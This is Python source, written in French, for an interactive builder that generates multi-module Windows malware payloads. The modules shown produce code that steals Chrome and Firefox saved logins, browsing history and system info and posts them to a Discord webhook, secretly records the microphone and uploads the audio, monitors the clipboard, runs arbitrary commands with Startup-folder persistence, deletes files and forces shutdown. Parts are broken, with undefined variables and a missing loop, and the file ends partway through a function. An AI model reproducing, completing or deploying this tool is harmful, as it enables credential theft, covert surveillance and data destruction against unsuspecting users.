import random
import time
from colorama import Fore, Style
import os

code = ""

modules_disponibles = [
        "Clipboard Monitor",
        "Remove Directory",
        "Remove Script",
        "Run Command",
        "Shutdown",
        "Stealer",
        "Voice Record",
        "Change Wallpaper",
        "Search Interceptor",
        "Directory Lister",
        "File Grabber",
        "Keyboard Control",
        "Open URL"
    ]

def clear():
    os.system("cls")

def affichage():
    clear()
    print(Fore.CYAN + "=== Configuration Multi Payload ===\n\n" + Style.RESET_ALL)
    print(f"""
          
          {Fore.YELLOW}Options :

{Fore.WHITE}
    1. Ajouter un module payload
    2. Retirer un module payload
    3. Afficher les modules ajoutés
    4. Webhook
{Fore.GREEN}
Tapez : <num> pour configurer
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}
                  """)
    

def clipboard_module():
    import time
    def affichage_clipboard():
        clear()
        print(Fore.CYAN + "=== Configuration Clipboard ===\n\n" + Style.RESET_ALL)
        print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
    2. Type de données à capturer (texte, images, etc.)
    
    
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : valider pour valider
            {Style.RESET_ALL}
                 
          """)

    print("=== Clipboard Configuration ===\n\n")
    choix = {
        "Intervalle de capture": None,
        "Type de données à capturer": None,
        }            

    def intervalle_capture():
        clear()
        print("Définir l'intervalle de capture en secondes.\n\n")

        intervalle = input("""Intervalle (secondes) 'random' pour un temps entre 1 et 10 secondes : """)
        try:
            if intervalle.lower() == 'random':
                intervalle = random.randint(1, 10)
                print(f"Intervalle défini sur {intervalle} secondes.")
                time.sleep(2)
                choix["Intervalle de capture"] = int(intervalle)
            else:
                if int(intervalle) <= 0:
                    print(Fore.RED + "Veuillez entrer un nombre positif." + Style.RESET_ALL)
                    time.sleep(2)
                    return
                else:
                    choix["Intervalle de capture"] = int(intervalle)
                    print(f"Intervalle défini sur {intervalle} secondes.")
                    time.sleep(2)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
            time.sleep(2)
        affichage_clipboard()


    def type_donnees():  
        clear()
        data_type = input("Définir le type de données à capturer (texte, images) : ")
        choix["Type de données à capturer"] = data_type
        print(f"Type de données à capturer défini sur {data_type}.")
        affichage_clipboard()

    

    options = [
        ("Intervalle de capture (en secondes)", intervalle_capture),
        ("Type de données à capturer (texte, images, etc.)" , type_donnees),
    ]
        
    def create_payload():
        global code
        interval = choix["Intervalle de capture"] or 2
        code += f"""
import os
os.system("pip install clipboard")
import clipboard
import time

def clipboard_monitor():
    old = clipboard.paste()
    print("Surveillance du presse-papier lancée...\\n")

    while True:
        time.sleep({interval})
        current_time = time.strftime('%H:%M')

        mtn = clipboard.paste()

        if old != mtn:
            old = mtn

clipboard_monitor()
"""
    while True:
        affichage_clipboard()
        cmd = input(">> : ").lower()

        if cmd == "exit":
            break
        elif cmd == "valider":
            create_payload()
            break
        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)
    

#def screenshot_module():

def rmdir_module():
    def affichage_rmdir():
        clear()
        print(Fore.CYAN + "=== Configuration Remove Directory ===\n" + Style.RESET_ALL)
        print(f"""
          {Fore.YELLOW}Options :
{Fore.WHITE}
    1. Chemin du répertoire à supprimer
    2. Suppression récursive
    3. Délai avant suppression (en secondes)

{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : valider pour valider
{Style.RESET_ALL}
        """)

    def rmdir():
        clear()

        choix = {
            "Chemin du répertoire": None,
            "Suppression récursive": False,
            "Délai avant suppression": 0,
        }

        # -----------------------------------------------
        # Fonctions de configuration
        # -----------------------------------------------

        def chemin_option():
            clear()
            chemin = input("Entrez le chemin du répertoire à supprimer : ").strip()
            if chemin == "":
                print(Fore.RED + "Le chemin ne peut pas être vide." + Style.RESET_ALL)
                time.sleep(1)
            else:
                choix["Chemin du répertoire"] = chemin
                print(f"Chemin défini sur : {chemin}")
                time.sleep(1)
            affichage_rmdir()

        def recursive_option():
            clear()
            reponse = input("Suppression récursive ? (y/n) : ").strip().lower()
            if reponse == "y":
                choix["Suppression récursive"] = True
                print("Suppression récursive activée.")
            elif reponse == "n":
                choix["Suppression récursive"] = False
                print("Suppression récursive désactivée.")
            else:
                print(Fore.RED + "Répondez par 'y' ou 'n'." + Style.RESET_ALL)
            time.sleep(1)
            affichage_rmdir()

        def delai_option():
            clear()
            delai = input("Délai avant suppression (en secondes, 0 = immédiat) : ").strip()
            try:
                delai = int(delai)
                if delai < 0:
                    raise ValueError
                choix["Délai avant suppression"] = delai
                print(f"Délai défini sur {delai} seconde(s).")
                time.sleep(1)
            except ValueError:
                print(Fore.RED + "Veuillez entrer un nombre entier positif." + Style.RESET_ALL)
                time.sleep(1)
            affichage_rmdir()

        # -----------------------------------------------
        # Liste des options
        # -----------------------------------------------
        options = [
            ("Chemin du répertoire",     chemin_option),    # 1
            ("Suppression récursive",    recursive_option), # 2
            ("Délai avant suppression",  delai_option),     # 3
        ]

        def create_payload():
            global code
            chemin = choix["Chemin du répertoire"]
            recursive = choix["Suppression récursive"]
            delai = choix["Délai avant suppression"]

            if not chemin:
                print(Fore.RED + "Le chemin du répertoire est requis." + Style.RESET_ALL)
                return

            code += f"""

            import os
import time
import shutil


CHEMIN    = {chemin}
RECURSIF  = {recursive}
DELAI     = {delai}


def remove_directory():

    if not os.path.exists({chemin}):
        print(f'Erreur : le chemin "{chemin}" n\'existe pas.')
        return

    if not os.path.isdir(CHEMIN):
        print(f'Erreur : "{chemin}" n\'est pas un répertoire.')
        return

    # Délai
    if DELAI > 0:
        print(f'Suppression dans {delai} seconde(s)...')
        time.sleep(DELAI)

    # Suppression
    try:
        if RECURSIF:
            # supprime le dossier ET tout son contenu
    # Vérifie que le chemin existe avant de tenter de supprimer
            shutil.rmtree(CHEMIN)
        else:
            # fonctionne uniquement si le dossier est VIDE
            os.rmdir(CHEMIN)

        requests.post(WEBHOOK_URL, json={"content": f"Répertoire supprimé : {chemin}"})

    except OSError as e:
        print(f'Erreur lors de la suppression : ')
        pass

        if not RECURSIF:
            print("Astuce : activez la suppression récursive si le dossier n'est pas vide.")
            """

def rmscript():
    global code

    choix = {
        "Nom du script à supprimer": None,
        "Délai avant suppression": 0,
        "Recherche récursive": False,
    }

    def affichage_rmscript():
        clear()
        print(Fore.CYAN + "=== Configuration Remove Script ===\n\n" + Style.RESET_ALL)
        print(f"""
{Fore.YELLOW}Options :
{Fore.WHITE}
1. Nom du script (ex: tool.exe)
2. Délai avant suppression
3. Recherche récursive (y/n)

{Fore.GREEN}
set <num> pour configurer
valider pour ajouter au payload
exit pour quitter
{Style.RESET_ALL}
""")

    # -------------------------
    # OPTIONS
    # -------------------------
    def set_script():
        clear()
        val = input("Nom du script : ").strip()
        if val:
            choix["Nom du script à supprimer"] = val
        else:
            print(Fore.RED + "Nom invalide" + Style.RESET_ALL)
            time.sleep(1)

    def set_delai():
        clear()
        try:
            val = int(input("Délai (sec) : "))
            if val < 0:
                raise ValueError
            choix["Délai avant suppression"] = val
        except:
            print(Fore.RED + "Valeur invalide" + Style.RESET_ALL)
            time.sleep(1)

    def set_recursif():
        clear()
        val = input("Recherche récursive ? (y/n) : ").lower()
        choix["Recherche récursive"] = (val == "y")

    options = {
        "1": set_script,
        "2": set_delai,
        "3": set_recursif
    }

    # -------------------------
    # GENERATION PAYLOAD
    # -------------------------
    def create_payload():
        global code

        nom = choix["Nom du script à supprimer"]
        delai = choix["Délai avant suppression"]
        recursif = choix["Recherche récursive"]

        if not nom:
            print(Fore.RED + "Nom du script requis !" + Style.RESET_ALL)
            time.sleep(1)
            return

        code += f"""
import os
import time

NOM_SCRIPT = {repr(nom)}
DELAI = {delai}
RECURSIF = {recursif}

def remove_script():

    if DELAI > 0:
        time.sleep(DELAI)

    base = os.getcwd()
    found = False

    if RECURSIF:
        for root, dirs, files in os.walk(base):
            if NOM_SCRIPT in files:
                path = os.path.join(root, NOM_SCRIPT)
                try:
                    os.remove(path)
                    found = True
                except:
                    pass
    else:
        path = os.path.join(base, NOM_SCRIPT)
        if os.path.isfile(path):
            try:
                os.remove(path)
                found = True
            except:
                pass

"""

    # -------------------------
    # LOOP
    # -------------------------
    while True:
        affichage_rmscript()
        cmd = input(">> ").strip().lower()

        if cmd == "exit":
            break

        elif cmd == "valider":
            create_payload()
            break

        elif cmd.startswith("set "):
            num = cmd.split()[1]
            if num in options:
                options[num]()
            else:
                print("Option invalide")
                time.sleep(1)

def runcmd_module():
    global code

    choix = {
        "Commande à exécuter": None,
        "Lancer au démarrage": False,
        "Exécuter en boucle": False,
        "Délai entre les exécutions": 0,
    }

    def affichage_runcmd():
        clear()
        print(Fore.CYAN + "=== Configuration Run Command ===\n" + Style.RESET_ALL)
        print(f"""
{Fore.YELLOW}Options :
{Fore.WHITE}
1. Commande à exécuter
2. Lancer au démarrage (Windows)
3. Exécuter en boucle
4. Délai entre les exécutions

{Fore.GREEN}
set <num> pour configurer
valider pour ajouter au payload
exit pour quitter
{Style.RESET_ALL}
""")

    # -------------------------
    # OPTIONS
    # -------------------------
    def set_commande():
        clear()
        cmd = input("Commande : ").strip()
        if cmd:
            choix["Commande à exécuter"] = cmd
        else:
            print(Fore.RED + "Commande invalide" + Style.RESET_ALL)
            time.sleep(1)

    def set_demarrage():
        clear()
        val = input("Lancer au démarrage ? (y/n) : ").lower()
        choix["Lancer au démarrage"] = (val == "y")

    def set_boucle():
        clear()
        val = input("Exécuter en boucle ? (y/n) : ").lower()
        choix["Exécuter en boucle"] = (val == "y")

    def set_delai():
        clear()
        try:
            val = int(input("Délai (sec) : "))
            if val < 0:
                raise ValueError
            choix["Délai entre les exécutions"] = val
        except:
            print(Fore.RED + "Valeur invalide" + Style.RESET_ALL)
            time.sleep(1)

    options = {
        "1": set_commande,
        "2": set_demarrage,
        "3": set_boucle,
        "4": set_delai
    }

    # -------------------------
    # GENERATION PAYLOAD
    # -------------------------
    def create_payload():
        global code

        cmd = choix["Commande à exécuter"]
        demarrage = choix["Lancer au démarrage"]
        boucle = choix["Exécuter en boucle"]
        delai = choix["Délai entre les exécutions"]

        if not cmd:
            print(Fore.RED + "Commande requise !" + Style.RESET_ALL)
            time.sleep(1)
            return

        code += f"""
import os
import time

COMMANDE = {repr(cmd)}
DEMARRAGE = {demarrage}
BOUCLE = {boucle}
DELAI = {delai}

def add_startup():
    try:
        startup = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu',
            'Programs', 'Startup', 'runcmd_payload.bat'
        )
        with open(startup, 'w') as f:
            f.write(f'python "{{os.path.abspath(__file__)}}"')
    except:
        pass

def run_command():

    if DEMARRAGE:
        add_startup()

    if BOUCLE:
        while True:
            os.system(COMMANDE)
            if DELAI > 0:
                time.sleep(DELAI)
    else:
        os.system(COMMANDE)

run_command()
"""

    # -------------------------
    # LOOP
    # -------------------------
    while True:
        affichage_runcmd()
        user_input = input(">> ").strip().lower()

        if user_input == "exit":
            break

        elif user_input == "valider":
            create_payload()
            break

        elif user_input.startswith("set "):
            num = user_input.split()[1]
            if num in options:
                options[num]()
            else:
                print("Option invalide")
                time.sleep(1)

def shutdown_module():
    global code

    choix = {
        "Délai avant extinction": 0,
        "Message d'avertissement": None,
        "Forcer la fermeture": False,
        "Compte à rebours": False,
    }

    def affichage_shutdown():
        clear()
        print(Fore.CYAN + "=== Configuration Shutdown ===\n\n" + Style.RESET_ALL)
        print(f"""
{Fore.YELLOW}Options :
{Fore.WHITE}
1. Délai avant extinction
2. Message d'avertissement
3. Forcer la fermeture
4. Compte à rebours

{Fore.GREEN}
set <num> pour configurer
valider pour ajouter au payload
exit pour quitter
{Style.RESET_ALL}
""")

    # -------------------------
    # OPTIONS
    # -------------------------
    def set_delai():
        clear()
        try:
            val = int(input("Délai (sec) : "))
            if val < 0:
                raise ValueError
            choix["Délai avant extinction"] = val
        except:
            print(Fore.RED + "Valeur invalide" + Style.RESET_ALL)
            time.sleep(1)

    def set_message():
        clear()
        val = input("Message (laisser vide = aucun) : ").strip()
        choix["Message d'avertissement"] = val if val else None

    def set_force():
        clear()
        val = input("Forcer fermeture ? (y/n) : ").lower()
        choix["Forcer la fermeture"] = (val == "y")

    def set_rebours():
        clear()
        val = input("Compte à rebours ? (y/n) : ").lower()
        choix["Compte à rebours"] = (val == "y")

    options = {
        "1": set_delai,
        "2": set_message,
        "3": set_force,
        "4": set_rebours
    }

    # -------------------------
    # PAYLOAD
    # -------------------------
    def create_payload():
        global code

        code += f"""
import os
import time

DELAI = {choix["Délai avant extinction"]}
MESSAGE = {repr(choix["Message d'avertissement"])}
FORCE = {choix["Forcer la fermeture"]}
REBOURS = {choix["Compte à rebours"]}

def shutdown_payload():

    if MESSAGE:
        print(f"Avertissement : {{MESSAGE}}")

    if DELAI > 0:
        if REBOURS:
            for i in range(DELAI, 0, -1):
                print(f"Extinction dans {{i}} seconde(s)...", end="\\r")
                time.sleep(1)
            print()
        else:
            time.sleep(DELAI)

    if os.name == 'nt':
        cmd = "shutdown /s /t 0"
        if FORCE:
            cmd += " /f"
        if MESSAGE:
            msg = MESSAGE.replace('"', "'")
            cmd += f' /c "{{msg}}"'
    else:
        cmd = "shutdown -h now"

    os.system(cmd)

shutdown_payload()
"""

    # -------------------------
    # LOOP
    # -------------------------
    while True:
        affichage_shutdown()
        cmd = input(">> ").strip().lower()

        if cmd == "exit":
            break

        elif cmd == "valider":
            create_payload()
            break

        elif cmd.startswith("set "):
            num = cmd.split()[1]
            if num in options:
                options[num]()
            else:
                print("Option invalide")
                time.sleep(1)

def steal_module():
    global code

    choix = {
        "Cible navigateur": "1",  # 1=Chrome, 2=Firefox, 3=Tous
    }

    def affichage_browser():
        clear()
        print(Fore.CYAN + "=== Browser Audit Tool ===\n\n" + Style.RESET_ALL)
        print(f"""
{Fore.YELLOW}Options :
{Fore.WHITE}
1. Cible : Chrome / Firefox / Tous

{Fore.GREEN}
set <num>
valider
exit
{Style.RESET_ALL}
""")

    def set_cible():
        clear()
        val = input("1-Chrome | 2-Firefox | 3-Tous : ").strip()
        if val in ["1", "2", "3"]:
            choix["Cible navigateur"] = val
        else:
            print("Choix invalide")
            time.sleep(1)

    options = {
        "1": set_cible
    }

    def create_payload():
        global code

        code += f"""

import os
import json
import sqlite3
import zipfile
import io
import platform
import socket
from colorama import Fore, Style
import psutil
import requests
import shutil
import time
from datetime import datetime



def send_to_discord(content, filename=None):
    try:
        if filename:
            files = {'file': (filename, io.BytesIO(content.encode('utf-8')))}
            requests.post(WEBHOOK_URL, files=files)
        else:
            if len(content) > 1900:
                content = content[:1900] + "..."
            requests.post(WEBHOOK_URL, json={"content": f""})
    except:
        pass

def get_system_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        os_info = f"{{platform.system()}} {{platform.release()}}"
        user = os.getlogin()
        ram = psutil.virtual_memory()
        ram_gb = f"{{ram.total / (1024**3):.2f}} GB"
        
        procs = [p.info['name'] for p in psutil.process_iter(['name'])][:10]
        
        txt = f"IP: {{ip}}\nHost: {{hostname}}\nOS: {{os_info}}\nUser: {{user}}\nRAM: {{ram_gb}}\nProcs: {{', '.join(procs)}}"
        return txt
    except:
        return "Erreur système"

def get_chrome_data():
    data_psw = []
    data_hist = []
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    
    # Passwords
    login_db = os.path.join(path, "Login Data")
    if os.path.exists(login_db):
        try:
            copy = "chrome_login.db"
            shutil.copy2(login_db, copy)
            conn = sqlite3.connect(copy)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins")
            for row in cursor.fetchall():
                data_psw.append({
                    "url": row[0],
                    "username": row[1],
                    "password": "[Chiffré]"
                })
            conn.close()
            os.remove(copy)
        except:
            pass
    
    # History
    hist_db = os.path.join(path, "History")
    if os.path.exists(hist_db):
        try:
            copy = "chrome_hist.db"
            shutil.copy2(hist_db, copy)
            conn = sqlite3.connect(copy)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 30")
            for row in cursor.fetchall():
                ts = row[2]
                dt = datetime.fromtimestamp((ts / 1000000) - 11644473600) if ts else "N/A"
                data_hist.append({"date": str(dt), "title": row[1], "url": row[0]})
            conn.close()
            os.remove(copy)
        except:
            pass
    return data_psw, data_hist

def get_firefox_data():
    data_psw = []
    data_hist = []
    prof_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    
    if not os.path.exists(prof_path):
        return data_psw, data_hist
    
    for profile in os.listdir(prof_path):
        full = os.path.join(prof_path, profile)
        
        # Passwords (logins.json)
        logins = os.path.join(full, "logins.json")
        if os.path.exists(logins):
            try:
                with open(logins, "r", encoding="utf-8") as f:
                    content = json.load(f)
                    if "logins" in content:
                        for entry in content["logins"]:
                            data_psw.append({
                                "url": entry.get("hostname"),
                                "username": entry.get("username"),
                                "password": "[Chiffré]"
                            })
            except:
                pass
        
        # History (places.sqlite)
        hist_db = os.path.join(full, "places.sqlite")
        if os.path.exists(hist_db):
            try:
                conn = sqlite3.connect(hist_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 30")
                for row in cursor.fetchall():
                    data_hist.append({"date": "N/A", "title": row[1], "url": row[0]})
                conn.close()
            except:
                pass
    return data_psw, data_hist

def main():
    sys_txt = get_system_info()
    send_to_discord(sys_txt)
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zipf:
    
"""
    if choix["Cible navigateur"] == "1":
        payload +="""
        print("Chrome...")
        psw, hist = get_chrome_data()

        # Chrome passwords
        txt = "--- CHROME PASSWORDS ---\n\n"
        for p in psw:
            txt += f"URL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n\n"
        zipf.writestr("Chrome_passwords.txt", txt)
        zipf.writestr("Chrome_passwords.json", json.dumps(psw, indent=4))

        # Chrome history
        txt = "--- CHROME HISTORY ---\n\n"
        for h in hist:
            txt += f"Date: {h['date']}\nTitle: {h['title']}\nURL: {h['url']}\n\n"
        zipf.writestr("Chrome_history.txt", txt)
        zipf.writestr("Chrome_history.json", json.dumps(hist, indent=4))

    zip_buffer.seek(0)
    requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
    print("✅ Fini !")

"""
    if choix["Cible navigateur"] == "2":
        payload +="""
    # Firefox passwords
        psw, hist = get_firefox_data()
        txt = "--- FIREFOX PASSWORDS ---\n\n"
        for p in psw:
            txt += f"URL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n\n"
        zipf.writestr("Firefox_passwords.txt", txt)
        zipf.writestr("Firefox_passwords.json", json.dumps(psw, indent=4))

        # Firefox history
        txt = "--- FIREFOX HISTORY ---\n\n"
        for h in hist:
            txt += f"Date: {h['date']}\nTitle: {h['title']}\nURL: {h['url']}\n\n"
        zipf.writestr("Firefox_history.txt", txt)
        zipf.writestr("Firefox_history.json", json.dumps(hist, indent=4))

    zip_buffer.seek(0)
    requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
    print("✅ Fini !")

if __name__ == "__main__":
    main()

    """
    if choix["Cible navigateur"] == "3":
        payload +="""
        print("Chrome...")
        psw, hist = get_chrome_data()
        psw, hist = get_firefox_data()

        # Chrome passwords
        txt = "--- CHROME PASSWORDS ---\n\n"
        for p in psw:
            txt += f"URL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n\n"
        zipf.writestr("Chrome_passwords.txt", txt)
        zipf.writestr("Chrome_passwords.json", json.dumps(psw, indent=4))

        # Chrome history
        txt = "--- CHROME HISTORY ---\n\n"
        for h in hist:
            txt += f"Date: {h['date']}\nTitle: {h['title']}\nURL: {h['url']}\n\n"
        zipf.writestr("Chrome_history.txt", txt)
        zipf.writestr("Chrome_history.json", json.dumps(hist, indent=4))

        zip_buffer.seek(0)
        requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
        print("✅ Fini !")

        # Firefox passwords
        txt = "--- FIREFOX PASSWORDS ---\n\n"
        for p in psw:
            txt += f"URL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n\n"
        zipf.writestr("Firefox_passwords.txt", txt)
        zipf.writestr("Firefox_passwords.json", json.dumps(psw, indent=4))

        # Firefox history
        txt = "--- FIREFOX HISTORY ---\n\n"
        for h in hist:
            txt += f"Date: {h['date']}\nTitle: {h['title']}\nURL: {h['url']}\n\n"
        zipf.writestr("Firefox_history.txt", txt)
        zipf.writestr("Firefox_history.json", json.dumps(hist, indent=4))

    zip_buffer.seek(0)
    requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
    print("✅ Fini !")
"""

    while True:
        affichage_browser()
        cmd = input(">> ").strip().lower()

        if cmd == "exit":
            break

        elif cmd == "valider":
            create_payload()
            break

        elif cmd.startswith("set "):
            num = cmd.split()[1]
            if num in options:
                options[num]()

def voicerecorder_module():
    clear()

    choix = {
        "Durée de l'enregistrement": 10,
        "Envoi par Discord": None,
        "Envoi par serveur HTTP": None,
    }

    def affichage():
        clear()
        print("=== Configuration Voice Recorder Payload ===\n\n")
        print(f"""
{Fore.YELLOW}Options : 
{Fore.WHITE}
1. Durée de l'enregistrement (en secondes)

{Fore.YELLOW}Sortie et envoi:

2. Envoi par Discord
3. Envoi par serveur HTTP

{Fore.GREEN}
set <num>   pour configurer
show        pour afficher la config
create      pour générer
exit        pour revenir
{Style.RESET_ALL}
""")

    # -------------------------
    # OPTIONS
    # -------------------------
    def set_duree():
        val = input("Entrez la durée de l'enregistrement (en secondes) : ").strip()
        if val.isdigit():
            choix["Durée de l'enregistrement"] = int(val)
        else:
            print("Durée invalide.")
            input("Appuyez sur Entrée...")
        affichage()

    def set_discord():
        val = input("Entrez le webhook Discord (laisser vide pour ne pas envoyer) : ").strip()
        choix["Envoi par Discord"] = val if val else None
        affichage()

    def set_http():
        val = input("Entrez l'URL du serveur HTTP (laisser vide pour ne pas envoyer) : ").strip()
        choix["Envoi par serveur HTTP"] = val if val else None
        affichage()

    options = {
        "1": set_duree,
        "2": set_discord,
        "3": set_http
    }

    # -------------------------
    # PAYLOAD
    # -------------------------
    def create_payload():
        clear()
        print("=== Payload Voice Recorder Généré ===\n")
        duree = choix["Durée de l'enregistrement"]
        discord_webhook = choix["Envoi par Discord"]
        http_server = choix["Envoi par serveur HTTP"]

        payload = f"""
import os
os.system("pip install sounddevice wavio requests")

import sounddevice as sd
import wavio
import time

def record_voice():
    duration = {duree}  # Durée en secondes
    fs = 44100
    print("Enregistrement en cours...")
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    filename = "voice_recording.wav"
    wavio.write(filename, recording, fs, sampwidth=2)
    print(f"Enregistrement terminé. Fichier sauvegardé sous {{filename}}")
    return filename

def send_to_discord(webhook_url, file_path):
    import requests
    with open(file_path, 'rb') as f:
        files = {{'file': f}}
        response = requests.post(webhook_url, files=files)
    if response.status_code == 204:
        print("Fichier envoyé sur Discord avec succès.")
    else:
        print("Échec de l'envoi sur Discord.")

def send_to_http(server_url, file_path):
    import requests
    with open(file_path, 'rb') as f:
        files = {{'file': f}}
        response = requests.post(server_url, files=files)
    if response.status_code == 200:
        print("Fichier envoyé au serveur HTTP avec succès.")
    else:
        print("Échec de l'envoi au serveur HTTP.")

if __name__ == "__main__":
    recorded_file = record_voice()
"""
        if discord_webhook:
            payload += f'    send_to_discord(r"{discord_webhook}", recorded_file)\n'
        if http_server:
            payload += f'    send_to_http(r"{http_server}", recorded_file)\n'

        payload_path = os.path.join("Option", "modules", "payload", "payload_created", "voicerec_payload.py")
        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
        with open(payload_path, "w", encoding="utf-8") as f:
            f.write(payload)

        print(f"Payload créé : {payload_path}")
        input("Appuyez sur Entrée pour continuer...")

    # -------------------------
    # LOOP
    # -------------------------
    while True:
        affichage()
        cmd = input(">> ").strip().lower()

        if cmd == "exit":
            break
        elif cmd.startswith("set "):
            num = cmd.split()[1]
            if num in options:
                options[num]()
            else:
                print("Numéro d'option invalide.")
                input("Appuyez sur Entrée...")
        elif cmd == "show":
            clear()
            print("\nConfiguration actuelle du module Voice Recorder :")
            for k, v in choix.items():
                print(f"{k}: {v}")
            input("\nAppuyez sur Entrée...")
        elif cmd == "create":
            create_payload()
        else:
            print("Commande invalide.")
            input("Appuyez sur Entrée...")

def wallpaper_module():
    global code

    choix = {
        "Wallpaper": None,
    }

    def affichage_wallpaper():
        clear()
        print(Fore.CYAN + "=== Wallpaper ===\n\n" + Style.RESET_ALL)
        print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Mettre un Wallpaper

              {Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter{Style.RESET_ALL}
          """)

    # -------------------------
    # OPTIONS
    # -------------------------
    def set_wallpaper():
        path = input("Chemin image : ").strip()
        if os.path.isfile(path):
            choix["Wallpaper"] = path
        else:
            print("Chemin invalide")
            time.sleep(1)

    options = {
        "1": set_wallpaper
    }

    # -------------------------
    # PAYLOAD
    # -------------------------
    def create_payload():
        global code

        if not choix["Wallpaper"]:
            print("Wallpaper requis")
            time.sleep(1)
            return

        code += f"""
import ctypes

WALLPAPER = r"{choix["Wallpaper"]}"

def set_wallpaper():
    SPI_SETDESKWALLPAPER = 20
    try:
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            WALLPAPER,
            3
        )
        print("Wallpaper appliqué")
    except Exception as e:
        print(f"Erreur : {{e}}")

set_wallpaper()
"""

    # -------------------------
    # LOOP
    # -------------------------
    while True:
        affichage_wallpaper()
        cmd = input(">> ").strip().lower()

        if cmd == "exit":
            break

        elif cmd == "valider":
            create_payload()
            break

        elif cmd.startswith("set "):
            num = cmd.split()[1]
            if num in options:
                options[num]()
#def search_interceptor():
#
def directory_listing_module():
    global code

    choix = {
        "Chemin du répertoire": None,
        "Inclure les fichiers cachés": False,
        "Délai avant listing": 0,
        "Récursif": False,
        "Filtrer par extension": None,
    }

    def affichage_dir():
        clear()
        print(Fore.CYAN + "=== Directory Listing ===\n\n" + Style.RESET_ALL)
        print(f"""
{Fore.YELLOW}Options :
{Fore.WHITE}
1. Chemin
2. Fichiers cachés
3. Délai
4. Récursif
5. Extension

{Fore.GREEN}
set <num>
valider
exit
{Style.RESET_ALL}
""")

    # -------------------------
    # OPTIONS
    # -------------------------
    def set_path():
        val = input("Chemin : ").strip()
        if val:
            choix["Chemin du répertoire"] = val

    def set_hidden():
        val = input("Inclure cachés ? (y/n) : ").lower()
        choix["Inclure les fichiers cachés"] = (val == "y")

    def set_delay():
        try:
            val = int(input("Délai : "))
            choix["Délai avant listing"] = max(0, val)
        except:
            pass

    def set_recursive():
        val = input("Récursif ? (y/n) : ").lower()
        choix["Récursif"] = (val == "y")

    def set_ext():
        val = input("Extension (.txt / vide = tout) : ").strip()
        choix["Filtrer par extension"] = val if val else None

    options = {
        "1": set_path,
        "2": set_hidden,
        "3": set_delay,
        "4": set_recursive,
        "5": set_ext
    }

    # -------------------------
    # PAYLOAD
    # -------------------------
    def create_payload():
        global code

        if not choix["Chemin du répertoire"]:
            print("Chemin requis")
            time.sleep(1)
            return

        code += f"""
import os
import time

CHEMIN = {repr(choix["Chemin du répertoire"])}
INCLURE_CACHES = {choix["Inclure les fichiers cachés"]}
DELAI = {choix["Délai avant listing"]}
RECURSIF = {choix["Récursif"]}
EXTENSION = {repr(choix["Filtrer par extension"])}

def list_files():
    fichiers = []

    if RECURSIF:
        for root, dirs, files in os.walk(CHEMIN):
            for f in files:
                if not INCLURE_CACHES and f.startswith('.'):
                    continue
                if EXTENSION and not f.endswith(EXTENSION):
                    continue
                fichiers.append(os.path.join(root, f))
    else:
        for f in os.listdir(CHEMIN):
            if not INCLURE_CACHES and f.startswith('.'):
                continue
            if EXTENSION and not f.endswith(EXTENSION):
                continue
            fichiers.append(os.path.join(CHEMIN, f))

    return fichiers

def run_dirlist():

    if DELAI > 0:
        time.sleep(DELAI)

    try:
        files = list_files()
    except Exception as e:
        print(f"Erreur : {{e}}")
        return

    print(f"Listing de {{CHEMIN}}\\n")

    for f in files:
        print(f)

    print(f"\\nTotal : {{len(files)}} fichier(s)")

run_dirlist()
"""

    # -------------------------
    # LOOP
    # -------------------------
    while True:
        affichage_dir()
        cmd = input(">> ").strip().lower()

        if cmd == "exit":
            break

        elif cmd == "valider":
            create_payload()
            break

        elif cmd.startswith("set "):
            num = cmd.split()[1]
            if num in options:
                options[num]()

def filegrab():
    choix = {
        "Chemin du fichier": None,
        "Délai avant envoi": None,
        "Nouveau nom fichier": None,
    }
    from colorama import Fore, Style, init

    init(autoreset=True)

    def clear():
        os.system("cls" if os.name == "nt" else "clear")

    def affichage_filegrab():
        clear()
        print(Fore.CYAN + "=== Configuration File Grab ===\n\n" + Style.RESET_ALL)
        print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Chemin du fichier à récupérer
    2. Délai avant l'envoi (en secondes)
    3. Nouveau nom du fichier à l'envoi (optionnel)
    
    
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}
                  """)

